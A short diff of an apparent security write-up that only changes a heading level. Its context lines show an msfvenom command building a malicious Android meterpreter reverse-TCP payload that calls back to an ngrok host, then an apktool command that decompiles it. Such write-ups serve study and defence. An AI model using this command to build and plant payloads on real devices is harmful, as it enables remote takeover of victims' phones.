@@ -89,7 +89,7 @@ Using Metasploit's msfvenom tool, I generated a malicious Android payload config
 
 ```msfvenom -p android/meterpreter/reverse_tcp LHOST=6.tcp.eu.ngrok.io LPORT=16690 -o payload.apk```
 
-###### Payload decompilation:
+##### Payload decompilation:
 
 ```apktool d payload.apk -o payload_decoded```
 
